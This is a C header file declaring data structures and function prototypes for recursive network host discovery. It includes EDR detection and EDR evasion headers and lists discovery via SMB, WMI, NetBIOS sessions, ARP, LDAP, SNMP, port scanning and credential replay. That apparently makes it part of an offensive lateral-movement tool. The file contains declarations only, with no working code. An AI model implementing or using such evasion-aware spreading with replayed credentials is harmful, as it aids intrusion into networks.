#ifndef NETWORK_RECURSIVE_H
#define NETWORK_RECURSIVE_H

#include "enumerator.h"
#include "edr_detection.h"
#include "edr_evasion.h"
#include <stdbool.h>
#include <stddef.h>

// Network host information
typedef struct {
    char ip_address[16];
    char hostname[256];
    char os_info[256];
    char mac_address[18];
    bool is_alive;
    bool has_smb;
    bool has_rdp;
    bool has_winrm;
    bool has_wmi;
    bool has_ssh;
    int open_ports[100];
    int port_count;
    char services[1024];
    int depth;  // Recursion depth
    char discovered_via[256];  // How this host was discovered
} network_host_t;

// Recursive discovery context
typedef struct {
    network_host_t* hosts;
    size_t host_count;
    size_t host_capacity;
    int max_depth;
    int current_depth;
    char* visited_ips[1000];
    size_t visited_count;
} recursive_discovery_t;

// Function prototypes
int enumerate_network_recursive(enum_data_t* data, int max_depth);
int discover_host_services(network_host_t* host);
int enumerate_smb_shares(const char* target_ip, enum_data_t* data);
int enumerate_wmi_remote(const char* target_ip, enum_data_t* data);
void discover_subnet_hosts(PIP_ADAPTER_INFO adapter, recursive_discovery_t* ctx, enum_data_t* data);
void discover_from_host(network_host_t* source_host, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_smb(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_wmi(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_netbios(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_netserver(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_netsession(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_netfile(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_arp_table(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_route_table(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_dns(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_ldap(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_snmp(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_port_scan(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
void discover_hosts_via_credential_replay(const char* target_ip, recursive_discovery_t* ctx, enum_data_t* data);
bool is_host_visited(recursive_discovery_t* ctx, const char* ip);
void add_visited_host(recursive_discovery_t* ctx, const char* ip);
network_host_t* add_discovered_host(recursive_discovery_t* ctx, const char* ip);
size_t count_hosts_with_service(recursive_discovery_t* ctx, const char* service);

#endif // NETWORK_RECURSIVE_H
